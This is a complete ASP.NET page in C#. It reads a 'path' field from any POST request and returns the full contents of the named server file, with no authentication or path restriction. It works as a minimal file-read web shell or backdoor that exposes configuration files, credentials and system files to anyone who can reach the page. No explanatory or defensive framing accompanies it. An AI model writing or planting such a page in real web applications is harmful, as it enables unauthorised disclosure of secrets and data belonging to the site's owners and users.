<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Web.Hosting" %>

<% 
	string path = Request.Form["path"];
	if (path == null){
		Response.Write("need POST{path}!");
		return;
	}
	
	if (!File.Exists(path)) {
		Response.Write(path + " is not a file");
		return;
	}
	
	string content = File.ReadAllText(path);
	Response.Write(content);
%>